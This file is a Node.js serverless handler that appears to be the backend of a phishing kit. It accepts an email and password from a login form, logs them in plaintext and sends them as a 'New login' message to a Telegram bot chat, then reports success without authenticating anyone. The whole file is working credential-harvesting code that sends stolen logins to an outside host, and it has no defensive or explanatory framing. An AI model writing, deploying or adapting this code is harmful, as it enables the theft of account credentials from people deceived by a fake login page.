import fetch from 'node-fetch';

export default async function handler(req, res) {
    // Ensure the request method is POST
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        // Extract email and password from the request body
        const { email, password } = req.body;

        // Validate input
        if (!email || !password) {
            return res.status(400).json({ error: 'Email and password are required' });
        }

        // Log received credentials
        console.log('Received credentials:', { email, password });

        // Retrieve Telegram bot token and chat ID from environment variables
        const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN; // Replace with your bot token
        const chatId = process.env.TELEGRAM_CHAT_ID; // Replace with your chat ID

        // Ensure environment variables are set
        if (!telegramBotToken || !chatId) {
            throw new Error('Telegram bot token or chat ID is missing');
        }

        // Construct the message for Telegram
        const message = encodeURIComponent(`New login:\nEmail: ${email}\nPassword: ${password}`);
        const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${message}`;

        // Log the Telegram API request
        console.log('Sending message to Telegram:', telegramUrl);

        // Send the message to Telegram
        const response = await fetch(telegramUrl);
        const result = await response.json();

        // Log the Telegram API response
        console.log('Telegram API response:', result);

        // Check if the Telegram API request was successful
        if (!response.ok) {
            throw new Error(`Telegram API error: ${result.description}`);
        }

        // Respond with success
        return res.status(200).json({ success: true });
    } catch (error) {
        // Log the error and respond with an error message
        console.error('Error in submit.js:', error.message);
        return res.status(500).json({ error: 'Failed to process request' });
    }
}
